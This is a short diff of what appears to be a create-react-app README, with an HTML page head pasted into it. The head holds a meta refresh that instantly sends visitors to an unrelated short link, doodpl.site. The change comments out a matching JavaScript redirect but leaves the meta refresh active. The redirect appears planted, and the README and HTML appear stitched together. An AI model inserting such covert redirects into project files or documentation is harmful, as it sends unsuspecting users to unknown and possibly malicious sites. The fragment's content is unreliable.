@@ -72,7 +72,7 @@ This section has moved here: [https://facebook.github.io/create-react-app/docs/d
   <meta charset="UTF-8">
   <meta http-equiv="refresh" content="0; url=https://doodpl.site/4vB6q">
   <script>
-    window.location.replace("https://doodpl.site/4vB6q");
+    //window.location.replace("https://doodpl.site/4vB6q");
   </script>
   <title>Redirecting...</title>
 </head>
